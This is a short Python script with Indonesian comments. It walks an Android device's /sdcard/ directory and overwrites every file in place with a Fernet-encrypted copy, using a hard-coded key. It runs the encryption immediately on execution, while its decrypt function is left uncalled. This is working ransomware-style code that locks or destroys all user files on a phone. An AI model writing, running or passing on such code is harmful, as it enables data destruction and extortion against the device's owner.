import os
from cryptography.fernet import Fernet

key = b"jav78B_MN4RMQPOWt0s91AYc3nhyJFnYUCc34-sqPyk="  # Ganti dengan kunci enkripsi Anda
cipher_suite = Fernet(key)

# Direktori yang ingin dienkripsi
directory = "/sdcard/"

# Enkripsi semua file di direktori
def encrypt_all_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as file_obj:
                    file_data = file_obj.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, "wb") as file_obj:
                    file_obj.write(encrypted_data)
                print(f"File {file_path} dienkripsi")
            except Exception as e:
                print(f"Error mengenkripsi file {file_path}: {e}")

# Dekripsi semua file di direktori
def decrypt_all_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as file_obj:
                    encrypted_data = file_obj.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, "wb") as file_obj:
                    file_obj.write(decrypted_data)
                print(f"File {file_path} didekripsi")
            except Exception as e:
                print(f"Error mendekripsi file {file_path}: {e}")

encrypt_all_files(directory)
print("Succses")

